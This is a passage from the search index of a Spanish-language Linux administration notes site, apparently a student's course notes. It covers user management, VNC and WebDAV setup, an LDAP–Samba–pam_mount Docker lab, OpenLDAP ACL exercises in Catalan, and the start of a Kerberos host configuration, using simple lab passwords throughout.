defecto y ese esqueleto se encuentra en /etc/skel Si tenemos diferentes tipos de usuarios a veces queremos que tengan distintos esqueletos de home, podemos asignar manualmente al crear el usuario o cambiarlo por defecto. Al crear usuario: se crea la cuenta en /etc/passwd se crea el grupo en /etc/group se crea el mail en /var/spool/mail/","title":"Esqueleto"},{"location":"administracion/usuarios/#logindefs","text":"/etc/login.defs fichero de configuraci\u00f3n de login guarda datos de: password,num maximo y minimo de usuarios, grupos autistas o por defect, home por defecto, umask, encriptacion, mail. formatos encryptacion: SHA512 MD5","title":"login.defs"},{"location":"administracion/usuarios/#borrar","text":"La opci\u00f3n userdel -r borra la cuenta, grupo primario si no es primario en otro user, el home y el mail. Pero para hacerlo correctamente debemos considerar diferentes aspectos. home si se quiere hacer una backup de ese home, para un futuro. mail si nel mail nos interesa conservarlo. archivos y directorios del usuario repartidos por el sistema, hacer backups o borrar, etc.. procesos en marcha siempre hay que matarlos, por posible malware intencionado. impresion trabajos de impresion es posible que se quieran guardar, podr\u00eda haber algo importante. Para estas acciones extra se puede crear un script que al ejecutar userdel se inicialize automaticamente. La opci\u00f3n la encontramos en /etc/login.defs . ... USERDEL_CMD /usr/sbin/script ... borrar usuario y sus datos userdel -r user","title":"Borrar"},{"location":"administracion/usuarios/#modificar","text":"Al modificar utilizamos las mismas opciones que creando, excepto en par\u00e1metros m\u00faltiples que a\u00f1ades -a (append) a no ser que quieras reescribir. usermod user -G grupo # indica que grupos secundarios pertenecera ( se come los anteriores ) -aG grupo # a\u00f1ade grupo secundario chfn cambiar informacion usuario El mismo usuario no podra cambiar la informacion de usuario a no ser que en /etc/login.defs este CHFN_RESTRICT yes . lo que si podra hacer es editar la informaci\u00f3n adicional de finger, desde .plan donde se inserta en formato texto. ver shells del sistema. cat /etc/shells","title":"Modificar"},{"location":"administracion/vnc/","text":"vnc vncserver@:1.service conectar al numero 1 de sesion grafica que representra el puerto 5900 +n\u00ba copiar vncserver@.service por vncserver_user1@.service al arrancar con el systemctl pasar argumento 1, 2 el que sea. Instalar vnc cliente/servidor sudo dnf install -y tigervnc tigervnc-server Configuraci\u00f3n servidor Por cada usuario que queramos que se conecte, se tiene que copiar el demonio original y re-nombrarlo, en este caso para user1 (este usuario tiene que existir en el servidor). sudo cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver_user1@.service Modificar e unit renombrado, simplemente cambiar <(USER)> original por el usuario que conectara, en los comentarios del archivo lo explica. [ Unit ] Description = Remote desktop service ( VNC ) After = syslog.target network.target [ Service ] Type = forking WorkingDirectory = /home/user1 User = user1 Group = user1 PIDFile = /home/user1/.vnc/%H%i.pid ExecStartPre = /bin/sh -c '/usr/bin/vncserver -kill %i > /dev/null 2>&1 || :' ExecStart = /usr/bin/vncserver -autokill %i ExecStop = /usr/bin/vncserver -kill %i Restart = on-success RestartSec = 15 [ Install ] WantedBy = multi-user.target Recargar dominios del sistema. sudo systemctl daemon-reload Configurar usuario de servidor El usuario a de tener una contrase\u00f1a para la conexi\u00f3n vnc, y se la a\u00f1ade con vncpasswd su - user1 [ user1@i09 ~ ] $ vncpasswd Password: Verify: Would you like to enter a view-only password ( y/n ) ? y Password: Verify: En el archivo ~/.vnc/xstartup del usuario user1 se indica que ejecutar al iniciar una sesi\u00f3n con vnc. [ user1@i09 ~ ] $ cat .vnc/xstartup #!/bin/sh unset SESSION_MANAGER unset DBUS_SESSION_BUS_ADDRESS exec dbus-launch startxfce4 #exec dbus-launch gnome-session #exec dbus-launch cinnamon-session [ user1@i09 ~ ] $ logout Escoger el escritorio que se quiera abrir, ha de estar instalado en el sistema. Encender servicio Para iniciar servicio se a de pasar un argumento, en este caso es el 1, que indica que iniciara sesi\u00f3n en $DISPLAY 1: sudo systemctl start vncserver_user1@:1.service si en este paso no arranca el servicio correctamente, es muy posible no tener bien el archivo ~/.vnc/xstartup Conexi\u00f3n vncviewer localhost:1 &","title":"vnc"},{"location":"administracion/vnc/#vnc","text":"vncserver@:1.service conectar al numero 1 de sesion grafica que representra el puerto 5900 +n\u00ba copiar vncserver@.service por vncserver_user1@.service al arrancar con el systemctl pasar argumento 1, 2 el que sea.","title":"vnc"},{"location":"administracion/vnc/#instalar-vnc-clienteservidor","text":"sudo dnf install -y tigervnc tigervnc-server","title":"Instalar vnc cliente/servidor"},{"location":"administracion/vnc/#configuracion-servidor","text":"Por cada usuario que queramos que se conecte, se tiene que copiar el demonio original y re-nombrarlo, en este caso para user1 (este usuario tiene que existir en el servidor). sudo cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver_user1@.service Modificar e unit renombrado, simplemente cambiar <(USER)> original por el usuario que conectara, en los comentarios del archivo lo explica. [ Unit ] Description = Remote desktop service ( VNC ) After = syslog.target network.target [ Service ] Type = forking WorkingDirectory = /home/user1 User = user1 Group = user1 PIDFile = /home/user1/.vnc/%H%i.pid ExecStartPre = /bin/sh -c '/usr/bin/vncserver -kill %i > /dev/null 2>&1 || :' ExecStart = /usr/bin/vncserver -autokill %i ExecStop = /usr/bin/vncserver -kill %i Restart = on-success RestartSec = 15 [ Install ] WantedBy = multi-user.target Recargar dominios del sistema. sudo systemctl daemon-reload","title":"Configuraci\u00f3n servidor"},{"location":"administracion/vnc/#configurar-usuario-de-servidor","text":"El usuario a de tener una contrase\u00f1a para la conexi\u00f3n vnc, y se la a\u00f1ade con vncpasswd su - user1 [ user1@i09 ~ ] $ vncpasswd Password: Verify: Would you like to enter a view-only password ( y/n ) ? y Password: Verify: En el archivo ~/.vnc/xstartup del usuario user1 se indica que ejecutar al iniciar una sesi\u00f3n con vnc. [ user1@i09 ~ ] $ cat .vnc/xstartup #!/bin/sh unset SESSION_MANAGER unset DBUS_SESSION_BUS_ADDRESS exec dbus-launch startxfce4 #exec dbus-launch gnome-session #exec dbus-launch cinnamon-session [ user1@i09 ~ ] $ logout Escoger el escritorio que se quiera abrir, ha de estar instalado en el sistema.","title":"Configurar usuario de servidor"},{"location":"administracion/vnc/#encender-servicio","text":"Para iniciar servicio se a de pasar un argumento, en este caso es el 1, que indica que iniciara sesi\u00f3n en $DISPLAY 1: sudo systemctl start vncserver_user1@:1.service si en este paso no arranca el servicio correctamente, es muy posible no tener bien el archivo ~/.vnc/xstartup","title":"Encender servicio"},{"location":"administracion/vnc/#conexion","text":"vncviewer localhost:1 &","title":"Conexi\u00f3n"},{"location":"administracion/webdav/","text":"webdav Que es webdav? Es un servidor de apache que nos permite administrar archivos estilo samba pero m\u00e1s globalizado, se puede administrar mediante un navegador web, explorador de archivos, y m\u00e1s programas que har\u00e1n de cliente webdav. Indica los pasos para hacerlo funcionar: A\u00f1adimos en /etc/httpd/conf/httpd.conf DocumentRoot /var/www/webdav/ <Directory /var/www/webdav/> Options Indexes MultiViews AllowOverride None Order allow,deny allow from all </Directory> Alias /webdav /var/www/webdav/ DAVLockDB /var/lib/webdav/DAVLock <Location /webdav> DAV On AuthType Basic AuthName \"webdav\" AuthUserFile /var/www/passwd.dav Require valid-user </Location> Instalar sudo dnf install -y httpd httpd-tools mod_ssl sudo mkdir /var/www/webdav sudo chown apache:apache /var/www/webdav sudo mkdir /var/lib/webdav sudo chown apache:apache /var/lib/webdav sudo touch /var/www/passwd.dav sudo htpasswd /var/www/passwd.dav jorge Con esto crearemos todas las carpetas, hacemos el chown a las mismas y definimos una contrase\u00f1a de webdav. Como montar las carpetas desde fstab: /etc/fstab A\u00f1adir: http://192.168.4.2/webdav/ /home/users/inf/wism2/ism47787241/webdav-companero davfs defaults,rw,uid = fran,gid = fran,_netdev,auto,dir_mode = 777 0 0 http://localhost/webdav/ /home/users/inf/wism2/ism47787241/webdav davfs defaults,rw,uid = jorge,gid = jorge,_netdev,auto,dir_mode = 777 0 0 /etc/davfs2/secrets A\u00f1adir: http://192.168.4.2 fran fran http://localhost jorge jorge Con esto ya podriamos montar las 2 carpetas sudo mount -a Montar carpetas en windows webdav conectar con windows inicio \u2192 servicios \u2192 cliente web --> general \u2192 tipo de arranque automatico inicio \u2192 regedit \u2192 HKEY_LOCAL_MACHINE--> SYSTEM \u2192 current control set \u2192 services \u2192 webclient \u2192 parameters --> BasicAuthLevel \u2192 informacion del valor 2 Desde el navegador de archivos equipo: conectar a una unidad de red. en carpeta: http://192.168.4.3/webdav \u200b Webdav 2 carpeta personal Creo carpetas y doi permisos sudo mkdir -p /var/www/webdav/home/jorge sudo mkdir -p /var/www/webdav/home/pastor sudo chown apache:apache /var/www/webdav/home/pastor sudo chown apache:apache /var/www/webdav/home/jorge A\u00f1ado usuarios y pasword al archivo de configuraci\u00f3n sudo htpasswd -b /var/www/passwd.dav jorge jorge sudo htpasswd -b /var/www/passwd.dav pastor pastor A\u00f1ado parametros de entreada a cada carpeta <Location /webdav/home/pastor> DAV On AuthType Basic AuthName \"webdav\" AuthUserFile /var/www/passwd.dav Require user pastor </Location> <Location /webdav/home/jorge> DAV On AuthType Basic AuthName \"webdav\" AuthUserFile /var/www/passwd.dav Require user jorge </Location> Script autamatizado #!/bin/bash clear echo \"En el siguiente escript crearas una carpeta personal en webdav\" echo \"\" echo -n \"Introduce el nombre de usuario la password sera la misma: \" read user sed -r 's/^(.*):.*/\\1/' /var/www/passwd.dav | egrep -w $user if [ $? == 0 ] ; then echo \"Ese usuario ya existe crea otro.\" else # creo user en archivo de acceso sudo htpasswd -b /var/www/passwd.dav $user $user # creo directorio en webdav sudo mkdir -p /var/www/webdav/home/ $user # a\u00f1ado configuraci\u00f3n en /etc/httpd/conf/httpd.conf echo \" <Location /webdav/home/ $user > DAV On AuthType Basic AuthName webdav AuthUserFile /var/www/passwd.dav Require user $user </Location>\" >> /etc/httpd/conf/httpd.conf # reinicio servicios sudo systemctl restart httpd.service fi","title":"webdav"},{"location":"administracion/webdav/#webdav","text":"","title":"webdav"},{"location":"administracion/webdav/#que-es-webdav","text":"Es un servidor de apache que nos permite administrar archivos estilo samba pero m\u00e1s globalizado, se puede administrar mediante un navegador web, explorador de archivos, y m\u00e1s programas que har\u00e1n de cliente webdav. Indica los pasos para hacerlo funcionar: A\u00f1adimos en /etc/httpd/conf/httpd.conf DocumentRoot /var/www/webdav/ <Directory /var/www/webdav/> Options Indexes MultiViews AllowOverride None Order allow,deny allow from all </Directory> Alias /webdav /var/www/webdav/ DAVLockDB /var/lib/webdav/DAVLock <Location /webdav> DAV On AuthType Basic AuthName \"webdav\" AuthUserFile /var/www/passwd.dav Require valid-user </Location>","title":"Que es webdav?"},{"location":"administracion/webdav/#instalar","text":"sudo dnf install -y httpd httpd-tools mod_ssl sudo mkdir /var/www/webdav sudo chown apache:apache /var/www/webdav sudo mkdir /var/lib/webdav sudo chown apache:apache /var/lib/webdav sudo touch /var/www/passwd.dav sudo htpasswd /var/www/passwd.dav jorge Con esto crearemos todas las carpetas, hacemos el chown a las mismas y definimos una contrase\u00f1a de webdav.","title":"Instalar"},{"location":"administracion/webdav/#como-montar-las-carpetas-desde-fstab","text":"/etc/fstab A\u00f1adir: http://192.168.4.2/webdav/ /home/users/inf/wism2/ism47787241/webdav-companero davfs defaults,rw,uid = fran,gid = fran,_netdev,auto,dir_mode = 777 0 0 http://localhost/webdav/ /home/users/inf/wism2/ism47787241/webdav davfs defaults,rw,uid = jorge,gid = jorge,_netdev,auto,dir_mode = 777 0 0 /etc/davfs2/secrets A\u00f1adir: http://192.168.4.2 fran fran http://localhost jorge jorge Con esto ya podriamos montar las 2 carpetas sudo mount -a","title":"Como montar las carpetas desde fstab:"},{"location":"administracion/webdav/#montar-carpetas-en-windows","text":"webdav conectar con windows inicio \u2192 servicios \u2192 cliente web --> general \u2192 tipo de arranque automatico inicio \u2192 regedit \u2192 HKEY_LOCAL_MACHINE--> SYSTEM \u2192 current control set \u2192 services \u2192 webclient \u2192 parameters --> BasicAuthLevel \u2192 informacion del valor 2 Desde el navegador de archivos equipo: conectar a una unidad de red. en carpeta: http://192.168.4.3/webdav \u200b","title":"Montar carpetas en windows"},{"location":"administracion/webdav/#webdav-2-carpeta-personal","text":"","title":"Webdav 2 carpeta personal"},{"location":"administracion/webdav/#creo-carpetas-y-doi-permisos","text":"sudo mkdir -p /var/www/webdav/home/jorge sudo mkdir -p /var/www/webdav/home/pastor sudo chown apache:apache /var/www/webdav/home/pastor sudo chown apache:apache /var/www/webdav/home/jorge","title":"Creo carpetas y doi permisos"},{"location":"administracion/webdav/#anado-usuarios-y-pasword-al-archivo-de-configuracion","text":"sudo htpasswd -b /var/www/passwd.dav jorge jorge sudo htpasswd -b /var/www/passwd.dav pastor pastor","title":"A\u00f1ado usuarios y pasword al archivo de configuraci\u00f3n"},{"location":"administracion/webdav/#anado-parametros-de-entreada-a-cada-carpeta","text":"<Location /webdav/home/pastor> DAV On AuthType Basic AuthName \"webdav\" AuthUserFile /var/www/passwd.dav Require user pastor </Location> <Location /webdav/home/jorge> DAV On AuthType Basic AuthName \"webdav\" AuthUserFile /var/www/passwd.dav Require user jorge </Location>","title":"A\u00f1ado parametros de entreada a cada carpeta"},{"location":"administracion/webdav/#script-autamatizado","text":"#!/bin/bash clear echo \"En el siguiente escript crearas una carpeta personal en webdav\" echo \"\" echo -n \"Introduce el nombre de usuario la password sera la misma: \" read user sed -r 's/^(.*):.*/\\1/' /var/www/passwd.dav | egrep -w $user if [ $? == 0 ] ; then echo \"Ese usuario ya existe crea otro.\" else # creo user en archivo de acceso sudo htpasswd -b /var/www/passwd.dav $user $user # creo directorio en webdav sudo mkdir -p /var/www/webdav/home/ $user # a\u00f1ado configuraci\u00f3n en /etc/httpd/conf/httpd.conf echo \" <Location /webdav/home/ $user > DAV On AuthType Basic AuthName webdav AuthUserFile /var/www/passwd.dav Require user $user </Location>\" >> /etc/httpd/conf/httpd.conf # reinicio servicios sudo systemctl restart httpd.service fi","title":"Script autamatizado"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/","text":"Ldap - Samba - Hostpam Se creara un servidor ldap con usuarios, un servidor samba con puntos de montaje para cada usuario y un host que autenticara usuarios mediante ldap, creara localmente un home a cada usuario y montara un recurso samba en el home del usuario. Ldap Partimos de un servidor ldap ya creado en docker con usuarios user01,...,user08 , estos usuarios est\u00e1n repartidos en diferentes grupos hisx1,...,hisx4 docker run --rm --name ldapserver -h ldapserver --net ldapnet -d jorgepastorr/ldapserver19 user01:*:7001:610:user01:/tmp/home/hisx1/user01:/bin/bash user02:*:7002:610:user02:/tmp/home/hisx1/user02:/bin/bash user03:*:7003:611:user03:/tmp/home/hisx2/user03: user04:*:7004:611:user04:/tmp/home/hisx2/user04: user05:*:7005:612:user05:/tmp/home/hisx3/user05: user06:*:7006:612:user06:/tmp/home/hisx3/user06: user07:*:7007:613:user07:/tmp/home/hisx4/user07: user08:*:7008:613:user08:/tmp/home/hisx4/user08: Samba El servidor samba tendr\u00e1 los usuarios locales samba lila, pla, rock, patipla , y ademas los usuarios samba de ldap. Para esto conectamos con el servidor ldap y los a\u00f1adimos a samba. Paquetes necesarios dnf install -y passwd nss-pam-ldapd authconfig samba samba-client Configurar conexi\u00f3n con ldap authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --enableldapauth \\ --ldapserver = 'ldapserver' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablemkhomedir \\ --updateall Encender servicio /sbin/nscd /sbin/nslcd ya podemos hacer getent passwd y ver los usuarios ldap. A\u00f1adir usuarios # usuarios locales samba useradd lila useradd rock useradd patipla useradd pla echo -e \"lila\\nlila\" | smbpasswd -a lila echo -e \"rock\\nrock\" | smbpasswd -a rock echo -e \"patipla\\npatipla\" | smbpasswd -a patipla echo -e \"pla\\npla\" | smbpasswd -a pla A mas de a\u00f1adir los usuarios ldap, hay que crearles el home y ponerles los permisos adecuados. # usuarios ldap samba for num in { 01 ..08 } do echo -e \"jupiter\\njupiter\" | smbpasswd -a user $num liniaget = $( getent passwd user $num ) uid = $( echo $liniaget | cut -d: -f 3 ) gid = $( echo $liniaget | cut -d: -f 4 ) homedir = $( echo $liniaget | cut -d: -f 6 ) if [ ! -d $homedir ] ; then mkdir -p $homedir cp -ra /etc/skel/. $homedir chown -R $uid : $gid $homedir fi done Configurar samba En la configuraci\u00f3n de samba nos interesa la secci\u00f3n de homes de usuario /etc/samba/smb.conf [ global ] workgroup = MYGROUP server string = Samba Server Version %v log file = /var/log/samba/log.%m max log size = 50 security = user passdb backend = tdbsam load printers = yes cups options = raw [ homes ] comment = Home Directories browseable = no writable = yes ; valid users = %S ; valid users = MYDOMAIN \\% S [ printers ] comment = All Printers path = /var/spool/samba browseable = no guest ok = no writable = no printable = yes Arrancar servicio /sbin/smbd /sbin/nmbd Host En el host nos interesa, tener conexi\u00f3n con ldap para la autentificaci\u00f3n y con samba para crear el punto de montaje. Paquetes necesarios dnf install -y passwd nss-pam-ldapd authconfig samba-client cifs-utils pam_mount Conexi\u00f3n ldap authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --enableldapauth \\ --ldapserver = 'ldapserver' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablemkhomedir \\ --updateall /sbin/nscd /sbin/nslcd Usuarios locales useradd local1 useradd local2 useradd local3 echo 'local1' | passwd local1 --stdin echo 'local2' | passwd local2 --stdin echo 'local3' | passwd local3 --stdin Montaje autom\u00e1tico Para que monte autom\u00e1ticamente, el recurso samba en el home hay que modificar system-auth y pam_mount.conf.xml . /etc/pam.d/system-auth #%PAM-1.0 # This file is auto-generated. # User changes will be destroyed the next time authconfig is run. auth required pam_env.so auth optional pam_mount.so auth required pam_faildelay.so delay = 2000000 auth sufficient pam_unix.so nullok try_first_pass auth requisite pam_succeed_if.so uid > = 1000 quiet_success auth sufficient pam_ldap.so use_first_pass auth required pam_deny.so account required pam_unix.so broken_shadow account sufficient pam_localuser.so account sufficient pam_succeed_if.so uid < 1000 quiet account [ default = bad success = ok user_unknown = ignore ] pam_ldap.so account required pam_permit.so password requisite pam_pwquality.so try_first_pass local_users_only retry = 3 authtok_type = password sufficient pam_unix.so sha512 shadow nullok try_first_pass use_authtok password sufficient pam_ldap.so use_authtok password required pam_deny.so session optional pam_keyinit.so revoke session required pam_limits.so -session optional pam_systemd.so session optional pam_mkhomedir.so umask = 0077 session [ success = 1 default = ignore ] pam_succeed_if.so service in crond quiet use_uid session required pam_unix.so session optional pam_ldap.so session [ success = ignore default = 1 ] pam_succeed_if.so uid > = 7000 session optional pam_mount.so Se a a\u00f1adido el modulo pam_mount.so con una condici\u00f3n, de que si el usuario tiene un uid >= 7000 ( los de ldap) se active. /etc/security/pam_mount.conf.xml ... <!-- Volume definitions --> <volume user = \"*\" fstype = \"cifs\" server = \"samba\" path = \"%(USER)\" mountpoint = \"~/%(USER)\" options = \"user=%(USER)\" /> ... Se este archivo le decimos que montar y donde. server=samba y path=\"%(USER)\" es equivalente a //server/user , donde el user sera el que inicia sesi\u00f3n. mountpoint\"~/%(USER)\" donde se montara. options=\"user=%(USER)\" el usuario con el que har\u00e1 la petici\u00f3n al recurso samba. Docker docker run --rm --name ldapserver -h ldapserver --net ldapnet -d jorgepastorr/ldapserver19 docker run --rm --name samba -h samba --net ldapnet --privileged -d jorgepastorr/samba19:pam docker run --rm --name pam -h pam --net ldapnet --privileged -it jorgepastorr/hostpam19:samba [ local1@pam ~ ] $ su - user01 pam_mount password: [ user01@pam ~ ] $ pwd /tmp/home/hisx1/user01 [ user01@pam ~ ] $ ls user01","title":"Ldap - Samba - Hostpam"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#ldap-samba-hostpam","text":"Se creara un servidor ldap con usuarios, un servidor samba con puntos de montaje para cada usuario y un host que autenticara usuarios mediante ldap, creara localmente un home a cada usuario y montara un recurso samba en el home del usuario.","title":"Ldap - Samba - Hostpam"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#ldap","text":"Partimos de un servidor ldap ya creado en docker con usuarios user01,...,user08 , estos usuarios est\u00e1n repartidos en diferentes grupos hisx1,...,hisx4 docker run --rm --name ldapserver -h ldapserver --net ldapnet -d jorgepastorr/ldapserver19 user01:*:7001:610:user01:/tmp/home/hisx1/user01:/bin/bash user02:*:7002:610:user02:/tmp/home/hisx1/user02:/bin/bash user03:*:7003:611:user03:/tmp/home/hisx2/user03: user04:*:7004:611:user04:/tmp/home/hisx2/user04: user05:*:7005:612:user05:/tmp/home/hisx3/user05: user06:*:7006:612:user06:/tmp/home/hisx3/user06: user07:*:7007:613:user07:/tmp/home/hisx4/user07: user08:*:7008:613:user08:/tmp/home/hisx4/user08:","title":"Ldap"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#samba","text":"El servidor samba tendr\u00e1 los usuarios locales samba lila, pla, rock, patipla , y ademas los usuarios samba de ldap. Para esto conectamos con el servidor ldap y los a\u00f1adimos a samba.","title":"Samba"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#paquetes-necesarios","text":"dnf install -y passwd nss-pam-ldapd authconfig samba samba-client","title":"Paquetes necesarios"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#configurar-conexion-con-ldap","text":"authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --enableldapauth \\ --ldapserver = 'ldapserver' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablemkhomedir \\ --updateall","title":"Configurar conexi\u00f3n con ldap"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#encender-servicio","text":"/sbin/nscd /sbin/nslcd ya podemos hacer getent passwd y ver los usuarios ldap.","title":"Encender servicio"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#anadir-usuarios","text":"# usuarios locales samba useradd lila useradd rock useradd patipla useradd pla echo -e \"lila\\nlila\" | smbpasswd -a lila echo -e \"rock\\nrock\" | smbpasswd -a rock echo -e \"patipla\\npatipla\" | smbpasswd -a patipla echo -e \"pla\\npla\" | smbpasswd -a pla A mas de a\u00f1adir los usuarios ldap, hay que crearles el home y ponerles los permisos adecuados. # usuarios ldap samba for num in { 01 ..08 } do echo -e \"jupiter\\njupiter\" | smbpasswd -a user $num liniaget = $( getent passwd user $num ) uid = $( echo $liniaget | cut -d: -f 3 ) gid = $( echo $liniaget | cut -d: -f 4 ) homedir = $( echo $liniaget | cut -d: -f 6 ) if [ ! -d $homedir ] ; then mkdir -p $homedir cp -ra /etc/skel/. $homedir chown -R $uid : $gid $homedir fi done","title":"A\u00f1adir usuarios"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#configurar-samba","text":"En la configuraci\u00f3n de samba nos interesa la secci\u00f3n de homes de usuario /etc/samba/smb.conf [ global ] workgroup = MYGROUP server string = Samba Server Version %v log file = /var/log/samba/log.%m max log size = 50 security = user passdb backend = tdbsam load printers = yes cups options = raw [ homes ] comment = Home Directories browseable = no writable = yes ; valid users = %S ; valid users = MYDOMAIN \\% S [ printers ] comment = All Printers path = /var/spool/samba browseable = no guest ok = no writable = no printable = yes","title":"Configurar samba"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#arrancar-servicio","text":"/sbin/smbd /sbin/nmbd","title":"Arrancar servicio"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#host","text":"En el host nos interesa, tener conexi\u00f3n con ldap para la autentificaci\u00f3n y con samba para crear el punto de montaje.","title":"Host"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#paquetes-necesarios_1","text":"dnf install -y passwd nss-pam-ldapd authconfig samba-client cifs-utils pam_mount","title":"Paquetes necesarios"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#conexion-ldap","text":"authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --enableldapauth \\ --ldapserver = 'ldapserver' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablemkhomedir \\ --updateall /sbin/nscd /sbin/nslcd","title":"Conexi\u00f3n ldap"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#usuarios-locales","text":"useradd local1 useradd local2 useradd local3 echo 'local1' | passwd local1 --stdin echo 'local2' | passwd local2 --stdin echo 'local3' | passwd local3 --stdin","title":"Usuarios locales"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#montaje-automatico","text":"Para que monte autom\u00e1ticamente, el recurso samba en el home hay que modificar system-auth y pam_mount.conf.xml . /etc/pam.d/system-auth #%PAM-1.0 # This file is auto-generated. # User changes will be destroyed the next time authconfig is run. auth required pam_env.so auth optional pam_mount.so auth required pam_faildelay.so delay = 2000000 auth sufficient pam_unix.so nullok try_first_pass auth requisite pam_succeed_if.so uid > = 1000 quiet_success auth sufficient pam_ldap.so use_first_pass auth required pam_deny.so account required pam_unix.so broken_shadow account sufficient pam_localuser.so account sufficient pam_succeed_if.so uid < 1000 quiet account [ default = bad success = ok user_unknown = ignore ] pam_ldap.so account required pam_permit.so password requisite pam_pwquality.so try_first_pass local_users_only retry = 3 authtok_type = password sufficient pam_unix.so sha512 shadow nullok try_first_pass use_authtok password sufficient pam_ldap.so use_authtok password required pam_deny.so session optional pam_keyinit.so revoke session required pam_limits.so -session optional pam_systemd.so session optional pam_mkhomedir.so umask = 0077 session [ success = 1 default = ignore ] pam_succeed_if.so service in crond quiet use_uid session required pam_unix.so session optional pam_ldap.so session [ success = ignore default = 1 ] pam_succeed_if.so uid > = 7000 session optional pam_mount.so Se a a\u00f1adido el modulo pam_mount.so con una condici\u00f3n, de que si el usuario tiene un uid >= 7000 ( los de ldap) se active. /etc/security/pam_mount.conf.xml ... <!-- Volume definitions --> <volume user = \"*\" fstype = \"cifs\" server = \"samba\" path = \"%(USER)\" mountpoint = \"~/%(USER)\" options = \"user=%(USER)\" /> ... Se este archivo le decimos que montar y donde. server=samba y path=\"%(USER)\" es equivalente a //server/user , donde el user sera el que inicia sesi\u00f3n. mountpoint\"~/%(USER)\" donde se montara. options=\"user=%(USER)\" el usuario con el que har\u00e1 la petici\u00f3n al recurso samba.","title":"Montaje autom\u00e1tico"},{"location":"administracion/ldap/Ldap-Samba-Hostpam/#docker","text":"docker run --rm --name ldapserver -h ldapserver --net ldapnet -d jorgepastorr/ldapserver19 docker run --rm --name samba -h samba --net ldapnet --privileged -d jorgepastorr/samba19:pam docker run --rm --name pam -h pam --net ldapnet --privileged -it jorgepastorr/hostpam19:samba [ local1@pam ~ ] $ su - user01 pam_mount password: [ user01@pam ~ ] $ pwd /tmp/home/hisx1/user01 [ user01@pam ~ ] $ ls user01","title":"Docker"},{"location":"administracion/ldap/acl_ejercicios/","text":"Implementar a la base de dades edt.org les seg\u00fcents ACLS: ldapmodify -x -D cn=Sysadmin,cn=config -w syskey -f acl.ldif L\u2019usuari \u201cAnna Pou\u201d \u00e9s ajudant de l\u2019administrador i t\u00e9 permisos per modificar-ho tot. Tothom pot veure totes les dades de tothom. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to * by dn.exact = \"cn=Anna Pou,ou=usuaris,dc=edt,dc=org\" write by * read L'usuari \u201cAnna Pou\u201d \u00e9s ajudant d\u2019administraci\u00f3. Tothom es pot modificar el seu propi email i homePhone. Tothom pot veure totes les dades de tothom. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = mail,homePhone by dn.exact = \"cn=Anna Pou,ou=usuaris,dc=edt,dc=org\" write by self write olcAccess: to * by dn.exact = \"cn=Anna Pou,ou=usuaris,dc=edt,dc=org\" write by * read Tot usuari es pot modificar el seu mail. Tothom pot veure totes les dades de tothom. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = mail by self write by * read olcAccess: to * by * read Tothom pot veure totes les dades de tothom, excepte els mail dels altres. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = mail by self read olcAccess: to * by * read Tot usuari es pot modificar el seu propi password i tothom pot veure totes les dades de tothom. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = userPassword by self write by * read olcAccess: to * by * read Tot usuari es pot modificar el seu propi password i tothom pot veure totes les dades de tothom, excepte els altres passwords. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = userPassword by self write by * auth olcAccess: to * by * read Tot usuari es pot modificar el seu propi password i tot usuari nom\u00e9s pot veure les seves pr\u00f2pies dades. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = userPassword by self write by * auth olcAccess: to * by self read by * search Tot usuari pot observar les seves pr\u00f2pies dades i modificar el seu propi password, email i homephone. L\u2019usuari \u201cAnna Pou\u201d pot modificar tots els atributs de tots excepte els passwords, que tampoc pot veure. L\u2019usuari \u201cPere Pou\u201d pot modificar els passwords de tothom. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = userPassword by dn.exact = \"cn=Pere Pou,ou=usuaris,dc=edt,dc=org\" write by self write by * auth olcAccess: to attrs = mail,homePhone by dn.exact = \"cn=Anna Pou,ou=usuaris,dc=edt,dc=org\" write by self write olcAccess: to * by dn.exact = \"cn=Anna Pou,ou=usuaris,dc=edt,dc=org\" write by self read by * search","title":"Acl ejercicios"},{"location":"administracion/ldap/host-kerberos-con-ldap/","text":"Instalaci\u00f3n host ldap-kerberos sudo dnf install -y nss-pam-ldapd authconfig \\ pam_krb5 krb5-workstation sudo authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --ldapserver = 'ldap.edt.org' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablekrb5 --krb5kdc = 'kserver.edt.org' \\ --krb5adminserver = 'kserver.edt.org' --krb5realm = 'EDT.ORG' \\ --enablemkhomedir \\ --updateall sudo systemctl start nslcd Si al autenticar con un usuario de ldap da el error pam_krb5[10992]: error updating ccache \"KCM:\" comentar la linea de cache KMC en /etc/krb5.conf.d/kcm_default_ccache # cat 